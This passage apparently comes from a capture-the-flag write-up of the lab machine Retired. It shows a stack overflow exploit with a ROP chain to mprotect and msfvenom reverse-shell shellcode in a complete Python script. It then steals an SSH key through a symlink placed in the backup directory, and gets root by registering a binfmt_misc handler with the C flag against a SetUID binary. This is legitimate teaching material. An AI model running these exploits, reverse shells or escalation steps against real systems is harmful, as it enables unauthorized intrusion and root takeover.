oxdf@hacky$ echo -e "\x00\x04\x00\x00Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0B" | nc 127.0.0.1 9999

```

Note the `\x00\x04\x00\x00` at the start. That’s the value 0x400, or 1024.

`gdb` crashes:

```

Thread 2.1 "activate_licens" received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0x7f32aae750c0 (LWP 1111329)]
[----------------------------------registers-----------------------------------]
RAX: 0x41e 
RBX: 0x5650ffba47c0 (<__libc_csu_init>: push   r15)
RCX: 0x0 
RDX: 0x7f32aae750c0 (0x00007f32aae750c0)
RSI: 0x0 
RDI: 0x7ffef9233190 --> 0x7f32ab051060 (<__funlockfile>:        endbr64)
RBP: 0x4132724131724130 ('0Ar1Ar2A')
RSP: 0x7ffef9233928 ("r3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9"...)
RIP: 0x5650ffba45c0 (<activate_license+643>:    ret)
R8 : 0x0 
R9 : 0x41e 
R10: 0x5650ffba50e6 --> 0x666963657073000a ('\n')
R11: 0x246 
R12: 0x5650ffba4220 (<_start>:  xor    ebp,ebp)
R13: 0x7ffef9233a80 ("Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0\n\376R#\371\376\177")
R14: 0x0 
R15: 0x0
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x5650ffba45b9 <activate_license+636>:       call   0x5650ffba40b0 <printf@plt>
   0x5650ffba45be <activate_license+641>:       nop
   0x5650ffba45bf <activate_license+642>:       leave  
=> 0x5650ffba45c0 <activate_license+643>:       ret    
   0x5650ffba45c1 <main>:       push   rbp
   0x5650ffba45c2 <main+1>:     mov    rbp,rsp
   0x5650ffba45c5 <main+4>:     sub    rsp,0x60
   0x5650ffba45c9 <main+8>:     mov    DWORD PTR [rbp-0x54],edi
[------------------------------------stack-------------------------------------]
0000| 0x7ffef9233928 ("r3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9"...)
0008| 0x7ffef9233930 ("Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay"...)
0016| 0x7ffef9233938 ("8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4A"...)
0024| 0x7ffef9233940 ("s1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7"...)
0032| 0x7ffef9233948 ("As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az"...)
0040| 0x7ffef9233950 ("6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2A"...)
0048| 0x7ffef9233958 ("s9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5"...)
0056| 0x7ffef9233960 ("At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az"...)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV

```

RIP shows the crash at the `ret` instruction. The SIGSEGV happens because it’s trying to move an illegal address from the top of the stack into RIP. Looking at RSP, the value that would have been loaded is `r3Ar4Ar5A`. `pattern_query` takes four characters/bytes to identify the offset:

```

oxdf@hacky$ pattern_offset.rb -q r3Ar
[*] Exact match at offset 520

```

If I take into account the length word, that’s 524 bytes to the return address.

#### mprotect Address

I’ll use my `read.sh` script to download a copy of the LIBC library from Retired (the full path is in the `maps` file).

`readelf` will give the offset into `libc` that `mprotect`:

```

oxdf@hacky$ readelf -s libs/_libc-2.31.so | grep ' mprotect'
  1225: 00000000000f8c20    33 FUNC    WEAK   DEFAULT   14 mprotect@@GLIBC_2.2.5

```

Based on the `maps` file, `libc` is loaded at 0x7f4888944000.

#### mprotect Gadgets

According the the `mprotect` [man page](https://man7.org/linux/man-pages/man2/mprotect.2.html), it takes three parameters:

```

int mprotect(void *addr, size_t len, int prot);

```

This means I’ll need to populate RDI, RSI, and RDX.

I’ll use [Ropper](https://github.com/sashs/Ropper) (`pip install ropper`) to find all three in the `libc.so.6` I downloaded from Retired:

```

oxdf@hacky$ ropper -f _libc.so.6 --search "pop rdi"
...[snip]...
0x0000000000026796: pop rdi; ret;
...[snip]...
oxdf@hacky$ ropper -f _libc.so.6 --search "pop rsi"
...[snip]...
0x000000000002890f: pop rsi; ret; 
...[snip]...
oxdf@hacky$ ropper -f _libc.so.6 --search "pop rdx"
...[snip]...
0x00000000000cb1cd: pop rdx; ret; 
...[snip]...

```

#### jmp RSP

Once I call `mprotect`, I’ll want to jump back onto the stack to execute shellcode. Unfortunately, there’s no `JMP RSP` gadget in `libc.so.6` or `activate_license`. Fortunately, there are other libraries in use by `activate_license`. When I download and check `libsqlite.so.0.8.6`, `ropper` finds a gadget:

```

oxdf@hacky$ ropper -f _libsqlite3.so.0.8.6 --search "jmp rsp"
...[snip]...
0x00000000000d431d: jmp rsp;

```

I’ll need to make sure to have the address at which that library is loaded in memory from the maps file above as well.

#### Shellcode

I’ll use `msfvenom` to generate the shellcode. I’m going to add the IP and port dynamically, so I’ll use the IP 18.52.86.120 (`\x12\x34\x56\x78`) and the port 56814 (`\xdd\xee`) so they are easily spotted in the resulting bytes:

![image-20220729181016190](https://0xdfimages.gitlab.io/img/image-20220729181016190.png)

#### Python Script

I would love to generate a really slick Python script that manages fetching all the addresses and returns a shell, but for now, I’m going with a quick and dirty version that has addresses hardcoded at the top.

```

#!/usr/bin/env python3

import requests
import socket
import struct

# Read from maps file
libc_base = 0x7f4888944000
libsql_base = 0x7f4888b09000
stack_start = 0x7ffe99226000
stack_end = 0x7ffe99247000

# Configure targets / attack IPs / port
TARGET_IP = "10.10.11.154"
REV_PORT = 443
REV_IP = "10.10.14.6"
PORT_IP = struct.pack("!H", REV_PORT) + socket.inet_aton(REV_IP)
URL = f'http://{TARGET_IP}/activate_license.php'

# msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT
sc  = b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"
sc += b"\x97\x48\xb9\x02\x00" + PORT_IP + b"\x51\x48"
sc += b"\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e"
sc += b"\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58"
sc += b"\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48"
sc += b"\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"

def p64(num):
    return struct.pack("<Q", num)

# ROP Addresses
mprotect = p64(libc_base + 0xf8c20)   # readelf -s _libc.so.6 | grep " mprotect"
pop_rdi  = p64(libc_base + 0x26796)   # ropper -f _libc.so.6 --search "pop rdi"
pop_rsi  = p64(libc_base + 0x2890f)   # ropper -f _libc.so.6 --search "pop rsi"
pop_rdx  = p64(libc_base + 0xcb1cd)   # ropper -f _libc.so.6 --search "pop rdx"
jmp_rsp  = p64(libsql_base + 0xd431d) # ropper -f _libsqlite3.so.0.8.6 --search "jmp rsp"
stack_size = stack_end - stack_start

buf  = b'A' * 520                     # get to ret address
buf += pop_rdi + p64(stack_start)     # RDI = memory to change
buf += pop_rsi + p64(stack_size)      # RSI = length of memory
buf += pop_rdx + p64(7)               # RDX = permissions; 7 = rwx
buf += mprotect                       # call mprotect
buf += jmp_rsp                        # jmp to stack
buf += sc                             # rev shell

# send exploit via license file upload
resp = requests.post(URL, files = {'licensefile': buf })

```

### Shell

Running `python shell.py` returns a shell:

![image-20220730055133286](https://0xdfimages.gitlab.io/img/image-20220730055133286.png)

The shell from this shellcode doesn’t show a prompt, so it’s important to have the `-v` in the `nc` so it reports the connection. I’ll upgrade with the [script shell upgrade](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```

oxdf@hacky$ nc -lnvp 443                                               
Listening on 0.0.0.0 443
Connection received on 10.10.11.154 45236
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@retired:/var/www$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo ; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@retired:/var/www$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

## Shell as dev

### Enumeration

#### Users

There’s one user with a home directory on the box, dev:

```

www-data@retired:/var/www$ ls -l /home/
total 4
drwx------ 6 dev dev 4096 Mar 11 14:36 dev

```

www-data has no access, but that’s where I’ll find `user.txt`.

#### /var/www

The shell connects back running from `/var/www`. In this directory, there are some interesting files:

```

www-data@retired:/var/www$ ls
2022-07-30_09-57-04-html.zip  2022-07-30_09-59-04-html.zip  license.sqlite
2022-07-30_09-58-04-html.zip  html

```

Every minute, a new file seems to be created, and the oldest one is deleted:

```

www-data@retired:/var/www$ ls
2022-07-30_09-58-04-html.zip  2022-07-30_10-00-04-html.zip  license.sqlite
2022-07-30_09-59-04-html.zip  html

```

There must be a cron doing this. I’ll find the file using `grep`:

```

www-data@retired:/var/www$ grep -r '\-html.zip' / 2>/dev/null        
/usr/bin/webbackup:DST="/var/www/$(date +%Y-%m-%d_%H-%M-%S)-html.zip"

```

While this command takes a couple minutes to complete, it finds the file in only a few seconds.

I’ll also note that the backups are owned by dev, which suggests the cron runs as dev.

#### webbackup

This file is a Bash script:

```

www-data@retired:/var/www$ file /usr/bin/webbackup
/usr/bin/webbackup: Bourne-Again shell script, ASCII text executable

```

It starts with the shebang and uses `set` to make Bash behave a bit more rationally:

```

#!/bin/bash
set -euf -o pipefail

```

From the [man page](https://linuxcommand.org/lc3_man_pages/seth.html) (this is not important to understand to solve Retired, but worth learning anyway):
- `-e` - Exit on any failed command
- `-u` - consider unset variables an error
- `-f` - disable globbing (using wildcards like `*` in filenames)
- `-o pipefail` - if any command in a pipeline fails (has a non-zero return), the last non-zero return is the return for the entire line

Then it changes into `/var/www`, defines `SRC` and `DST`, removes `SRC`, and generates it using `zip`:

```

cd /var/www/

SRC=/var/www/html
DST="/var/www/$(date +%Y-%m-%d_%H-%M-%S)-html.zip"

/usr/bin/rm --force -- "$DST"
/usr/bin/zip --recurse-paths "$DST" "$SRC"

```

The `DST` is the time-based filename observed earlier. I’m not completely sure why it’s removed first, but it seems like an abundance of caution. `--recurse-paths` just makes this `zip` recursive, getting all folders and files in `SRC`.

Finally, there’s a loop to remove old backups:

```

KEEP=10
/usr/bin/find /var/www/ -maxdepth 1 -name '*.zip' -print0 \
    | sort --zero-terminated --numeric-sort --reverse \
    | while IFS= read -r -d '' backup; do
        if [ "$KEEP" -le 0 ]; then
            /usr/bin/rm --force -- "$backup"
        fi
        KEEP="$((KEEP-1))"
    done

```

This loop gets all the `.zip` files in `/var/www`, sorts them, and then loops over them, each time decrementing `$KEEP`, which is initialized to 10 before the loop. If `$KEEP` is less than 0, it will delete the file, effectively keeping the most recent 11 files.

It’s a bit odd that I only see the most three (sometimes four) backups (I’ll go into this in [Beyond Root](#webbackup-1)).

### Backup /home/dev

`zip` has an option, `-y` or `--symlinks` which:

> For UNIX and VMS (V8.3 and later), store symbolic links as such in the *zip* archive, instead of compressing and storing the file referred to by the link. This can avoid multiple copies of files being included in the archive as *zip* recurses the directory trees and accesses files directly and by links.

That suggests the default behavior is to follow symlinks and put the files they point to into the zip directly. I’ll abuse this by adding a symlink to `/home/dev` to `/var/www/html`:

```

www-data@retired:/var/www/html$ ln -s /home/dev/ .0xdf

```

The next time the cron runs, the backup is bigger:

```

www-data@retired:/var/www$ ls -l
total 2032
-rw-r--r-- 1 dev      www-data 505153 Jul 31 10:54 2022-07-31_10-54-05-html.zip
-rw-r--r-- 1 dev      www-data 505153 Jul 31 10:55 2022-07-31_10-55-05-html.zip
-rw-r--r-- 1 dev      www-data 505153 Jul 31 10:56 2022-07-31_10-56-05-html.zip
-rw-r--r-- 1 dev      www-data 529771 Jul 31 10:57 2022-07-31_10-57-05-html.zip
drwxrwsrwx 5 www-data www-data   4096 Jul 31 10:56 html
-rw-r--r-- 1 www-data www-data  20480 Jul 30 09:51 license.sqlite

```

I’ll extract the backup into `/dev/shm`:

```

www-data@retired:/var/www$ unzip 2022-07-31_10-57-05-html.zip -d /dev/shm/
...[snip]...

```

And dev’s homedir is there:

```

www-data@retired:/dev/shm/var/www/html/.0xdf$ ls -la
total 12
drwx------ 6 www-data www-data  180 Mar 11 14:36 .
drwxrwxrwx 6 www-data www-data  200 Jul 31 10:56 ..
-rw------- 1 www-data www-data  220 Aug  4  2021 .bash_logout
-rw------- 1 www-data www-data 3526 Aug  4  2021 .bashrc
drwxr-xr-x 3 www-data www-data   60 Mar 11 14:36 .local
-rw------- 1 www-data www-data  807 Aug  4  2021 .profile
drwx------ 2 www-data www-data  100 Mar 11 14:36 .ssh
drwx------ 2 www-data www-data  120 Mar 11 14:36 activate_license
drwx------ 3 www-data www-data  180 Mar 11 14:36 emuemu

```

Including an SSH key pair:

```

www-data@retired:/dev/shm/var/www/html/.0xdf$ ls  .ssh/  
authorized_keys  id_rsa  id_rsa.pub

```

### SSH

I’ll save the key and use it to get a shell as dev:

```

oxdf@hacky$ ssh -i ~/keys/retired-dev dev@10.10.11.154
Linux retired 5.10.0-11-amd64 #1 SMP Debian 5.10.92-2 (2022-02-28) x86_64
...[snip]..
dev@retired:~$

```

## Shell as root

### Enumeration

#### Home Directory

There are two folders in dev’s homedir:

```

dev@retired:~$ ls
activate_license  emuemu  user.txt

```

`activate_license` is the software I already exploited to get a foothold. The source is here, as well as a compiled binary, and a Makefile:

```

dev@retired:~/activate_license$ ls
Makefile  activate_license  activate_license.c  activate_license.service

```

`Makefile` can be interesting because it shows how the binary is compiled:

```

CC     := gcc
CFLAGS := -g -std=c99 -Wall -Werror -Wextra -Wpedantic \
                   -Wconversion -Wsign-conversion \
                   -fno-stack-protector \
                   -m64 -pie -fPIE -fPIC \
                   -Wl,-z,noexecstack \
                   -Wl,-z,relro,-z,now
LDLIBS := -lsqlite3

SOURCE := activate_license.c
TARGET := $(SOURCE:.c=)

install: $(TARGET)
        install --mode 0755 $^ /usr/bin/
        install --mode 0644 $^.service /usr/lib/systemd/system
        systemctl daemon-reload
        systemctl enable --now $^.service

clean:
        rm -f -- $(TARGET)

```

But not much interesting here.

#### emuemu

`emuemu` is a different project that was mentioned on the website. It has a few files:

```

dev@retired:~/emuemu$ find . -type f
./test/examplerom
./reg_helper
./reg_helper.c
./README.md
./emuemu
./emuemu.c
./Makefile

```

The `README.md` describes the project:

```

EMUEMU is the official software emulator for the handheld console OSTRICH.

After installation with `make install`, OSTRICH ROMs can be simply executed from the terminal.
For example the ROM named `rom` can be run with `./rom`.

```

`emuemu` doesn’t currently do anything:

```

#include <stdio.h>

/* currently this is only a dummy implementation doing nothing */

int main(void) {
    puts("EMUEMU is still under development.");
    return 1;
}

```

`reg_helper` is a wrapper that takes from standard in and writes to `/proc/sys/fs/binfmt_misc/register`:

```

#define _GNU_SOURCE

#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

int main(void) {
    char cmd[512] = { 0 };

    read(STDIN_FILENO, cmd, sizeof(cmd)); cmd[-1] = 0;

    int fd = open("/proc/sys/fs/binfmt_misc/register", O_WRONLY);
    if (-1 == fd)
        perror("open");
    if (write(fd, cmd, strnlen(cmd,sizeof(cmd))) == -1)
        perror("write");
    if (close(fd) == -1)
        perror("close");

    return 0;
}

```

The `Makefile` with the `install` directive compiles `reg_helper` and installs it to `/usr/lib/emuemu/reg_helper`, and then sets the `cap_dac_override` capabilities on it, before using it to register Ostrich ROMs (I’ll detail that syntax next):

```

CC := gcc
CFLAGS := -std=c99 -Wall -Werror -Wextra -Wpedantic -Wconversion -Wsign-conversion

SOURCES := $(wildcard *.c)
TARGETS := $(SOURCES:.c=)

.PHONY: install clean

install: $(TARGETS)
        @echo "[+] Installing program files"
        install --mode 0755 emuemu /usr/bin/
        mkdir --parent --mode 0755 /usr/lib/emuemu /usr/lib/binfmt.d
        install --mode 0750 --group dev reg_helper /usr/lib/emuemu/
        setcap cap_dac_override=ep /usr/lib/emuemu/reg_helper

        @echo "[+] Register OSTRICH ROMs for execution with EMUEMU"
        echo ':EMUEMU:M::\x13\x37OSTRICH\x00ROM\x00::/usr/bin/emuemu:' \
                | tee /usr/lib/binfmt.d/emuemu.conf \
                | /usr/lib/emuemu/reg_helper

clean:
        rm -f -- $(TARGETS)

```

This clearly has to be run as root, as it’s assigning capabilities to a binary. `cap_dac_override` (from the [capabilities man page](https://man7.org/linux/man-pages/man7/capabilities.7.html)) allows:

> ```

> Bypass file read, write, and execute permission checks.
> (DAC is an abbreviation of "discretionary access
> control".)
>
> ```

That capability is set on the file on Retired:

```

dev@retired:~$ /usr/sbin/getcap /usr/lib/emuemu/reg_helper 
/usr/lib/emuemu/reg_helper cap_dac_override=ep

```

So `reg_helper` can read and write any file it wants.

### Abuse binfmt\_misc

#### binfmt\_misc Background

Miscellaneous Binary Format (or `binfmt_misc`) is a way to register certain file types with a program to run them. Each mapping takes either a file extension or [magic bytes](https://en.wikipedia.org/wiki/File_format#Magic_number) and an interpreter, and then whenever a file is invoked with `./file`, if it matches that pattern, it will be passed to that interpreter.

This serves a similar purpose to a [shebang](https://en.wikipedia.org/wiki/Shebang_(Unix)) at the top of a script file.

`binfmt_misc` is managed from `/proc/sys/fs/binfmt_misc`. There are two files in that folder by default, `register` and `status`. The interface to create a new association is to write to `register` using a specific format, defined as:

```

:name:type:offset:magic:mask:interpreter:flags

```
- `name` - the name of the binary format
- `type` - either `E` for extension or `M` for magic
- `offset` - number of bytes to scan to look for magic bytes (ignored for `E`)
- `magic` - either the extension or the magic bytes signature
- `mask` - a bitmask to define which bits to match on (ignored for `E`)
- `interpreter` - the program that will run with the matching file as an argument
- `flags`
  - `P` - leave `argv[0]` as the original file name
  - `O` - open the file and pass the file handle instead of the filename
  - `C` - set the process credentials based on the program rather than the interpreter (for SetUID)
  - `F` - make the kernel open the binary at config rather than at startup (to be available in mount namespaces and chroots as well).

#### EMUEMU Mapping

Looking at the `Makefile`, the string `:EMUEMU:M::\x13\x37OSTRICH\x00ROM\x00::/usr/bin/emuemu:` was passed. So it will be:
- `name` - EMUEMU
- using magic bytes
- no offset
- signature of `\x13\x37OSTRICH\x00ROM\x00`
- no mask
- interpreter of `/usr/bin/emuemu`

The `EMUEMU` file stores these configurations:

```

dev@retired:/proc/sys/fs/binfmt_misc$ cat EMUEMU 
enabled
interpreter /usr/bin/emuemu
flags: 
offset 0
magic 13374f53545249434800524f4d00

```

The example ROM file matches this siguature:

```

dev@retired:~/emuemu$ cat test/examplerom  | xxd
00000000: 1337 4f53 5452 4943 4800 524f 4d00 0a74  .7OSTRICH.ROM..t
00000010: 6869 7320 6973 2061 206d 696e 696d 616c  his is a minimal
00000020: 2072 6f6d 2077 6974 6820 6120 7661 6c69   rom with a vali
00000030: 6420 6669 6c65 2074 7970 6520 7369 676e  d file type sign
00000040: 6174 7572 650a                           ature.

```

When I run it, it runs `emuemu`:

```

dev@retired:~/emuemu$ test/examplerom 
EMUEMU is still under development.
dev@retired:~/emuemu$ ./emuemu 
EMUEMU is still under development.

```

In theory once `emuemu` is more mature, it will read the ROM file and act based on it. But for now, it just prints.

#### Exploitation Strategy

There are a few resources that show how to exploit this.
- [This YouTube video from HITB 2021](https://youtu.be/WBC7hhgMvQQ?t=896) includes a section on abusing `binfmt_misc`, but for more complex situations (container breakouts).
- SentinelOne has two blog posts about this technique, which they call “Shadow SUID”. [The first](https://www.sentinelone.com/blog/shadow-suid-for-privilege-persistence-part-1/) lays out how this works. The [second](https://www.sentinelone.com/blog/shadow-suid-privilege-persistence-part-2/) goes into exploiting it.

The idea is that we are going to use the `C` flag, to pull credentials from the program, not the interpreter. That means if I manage to run a SetUID binary, then I will get root privs and our handler running it.

I’ll need:
- an interpreter that gives a shell
- a rule that matches on a SetUID binary and calls my interpreter, with the `C` flag

#### Interpreter

I’ll create a simple C program that creates a Bash shell as root:

```

#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    char *const paramList[10] = {"/bin/bash", "-p", NULL};
    const int id = 0;
    setresuid(id, id, id);
    execve(paramList[0], paramList, NULL);
    return 0;
}

```

There are lots of variations on this that work, but this one will work in the most cases, as I discussed in [a longer breakdown](/2022/05/31/setuid-rabbithole.html).

I’ll compile that on Retired:

```

dev@retired:/dev/shm$ gcc -o 0xdf 0xdf.c 

```

#### Shell via Magic Match

I’ll show two ways to get a matching signature. The first (as shown in the [SentinelOne post](https://www.sentinelone.com/blog/shadow-suid-privilege-persistence-part-2/)) is what’s in the blog post, using magic to match the initial bytes of the target file.

I need any SetUID binary:

```

dev@retired:/dev/shm$ find / -perm -4000 2>/dev/null
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/mount
/usr/bin/umount
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign

```

`newgrp` seems reasonable.

I’ll create that pattern using `xxd`, `head`, and `sed`:

```

dev@retired:/dev/shm$ cat /usr/bin/newgrp | xxd -p | head -1 | sed 's/\(..\)/\\x\1/g'
\x7f\x45\x4c\x46\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x3e\x00\x01\x00\x00\x00\xd0\x47\x00\x00\x00\x00

```

The registration still now gets passed to `/usr/lib/emuemu/reg_helper`:

```

dev@retired:/dev/shm$ echo ':0xdf:M::\x7f\x45\x4c\x46\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x3e\x00\x01\x00\x00\x00\xd0\x47\x00\x00\x00\x00::/dev/shm/0xdf:C' | /usr/lib/emuemu/reg_helper

```

That breaks down to:
- `name` - 0xdf (arbitrary)
- using magic bytes
- no offset
- signature that matches the first 30 bytes of `newgrp`
- no mask
- interpreter of `/dev/shm/0xdf`
- `C` flag

It works:

```

dev@retired:/dev/shm$ cat /proc/sys/fs/binfmt_misc/0xdf 
enabled
interpreter /dev/shm/0xdf
flags: OC
offset 0
magic 7f454c4602010100000000000000000003003e0001000000d04700000000

```

Now running `newgrp` returns a root shell:

```

dev@retired:/dev/shm$ newgrp
root@retired:/dev/shm# 

```

That’s because the start of `newgrp` matches the magic signature for the `0xdf` rule. So `binfmt_misc` calls `/dev/shm/0xdf newgrp`, and does it as root because `newgrp` is SetUID and the rule has the `C` flag. `/dev/shm/0xdf` doesn’t care about `newgrep`, but rather just calls Bash, returning a shell.

I can grab `root.txt`:

```

root@retired:/root# cat root.txt
f956b211************************

```

I can clean up that registration by sending -1 into that file:

```

root@retired:/dev/shm# echo -1 > /proc/sys/fs/binfmt_misc/0xdf  
root@retired:/dev/shm# ls /proc/sys/fs/binfmt_misc/    
EMUEMU  register  status

```

#### Shell via Extension Match

Instead of a binary match, I can do an extension match, because of how `binfmt_misc` handles symlinks.

I’ll create a link to any SetUID binary (I’ll use `newgrp` again):

```

dev@retired:/dev/shm$ ln -vs /usr/bin/newgrp 0xdf.sploit
'0xdf.sploit' -> '/usr/bin/newgrp'

```

Now I’ll register the `.sploit` (again, could be anything, as long as it matches the symlink) extension to my handler:

```

dev@retired:/dev/shm$ echo ':sploit:E::sploit::/dev/shm/0xdf:C' | /usr/lib/emuemu/reg_helper

```

That breaks down to:
- `name` - sploit (arbitrary)
- using extension
- no offset (ignored for extension)
- extension of `.sploit`
- no mask (ignore for extension)
- interpreter of `/dev/shm/0xdf`
- `C` flag

That generates the mapping:

```

dev@retired:/dev/shm$ cat /proc/sys/fs/binfmt_misc/sploit 
enabled
interpreter /dev/shm/0xdf
flags: OC
extension .sploit

```

Now running `./0xdf.sploit` will be caught by `binfmt_misc`, call the `/dev/shm/0xdf` handler with the permissions of `newgrp`, returning a root shell:

```

dev@retired:/dev/shm$ ./0xdf.sploit 
root@retired:/dev/shm#

